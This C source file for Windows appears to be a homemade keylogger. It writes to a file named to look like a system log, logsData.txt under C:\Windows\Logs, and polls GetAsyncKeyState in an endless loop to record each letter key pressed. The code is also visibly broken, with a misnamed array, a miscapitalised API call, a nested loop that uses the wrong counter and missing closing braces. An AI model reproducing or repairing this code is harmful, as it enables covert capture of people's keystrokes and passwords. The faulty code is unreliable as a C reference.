# include <stdio.h>
# include <windows.h>
int main(){
 //Create file.txt
 const char *route = ("C:\\Windows\\Logs\\logsData.txt");
 FILE *f = fopen(route, "w"); //f is file
 if(f == NULL){
  perror("Error creating file");
  return 1;
 }
 char mayusArr[] = {
    'A','B','C','D','E','F','G','H','I','J','K','L','M',
    'N','Ñ','O','P','Q','R','S','T','U','V','W','X','Y','Z' 
 };
char minusAarr[] = {
    'a','b','c','d','e','f','g','h','i','j','k','l','m',
    'n','o','p','q','r','s','t','u','v','w','x','y','z'
};
while(1){
 int mayusArrLen = sizeof(mayusArr) / sizeof(mayusArr[0]); // MayusArray Length
 int minusArrLen = sizeof(minusArr) / sizeof(minusArr[0]); // MinusArray Lenght
 for(int x = 0; x<mayusArrLen;x++){
 if(GetAsyncKeyState(mayusArr[x]) & 0x8000){
  fprintf(f,"%c",mayusArr[x]);
  fflush(f);
 }
 for(int y = 0; x<minusArrLen;x++){
  if(getAsyncKeyState(minusArr[y])){
   fprintf(f,"%c",minusArr[y]);
   fflush(f);
  }
 }
}
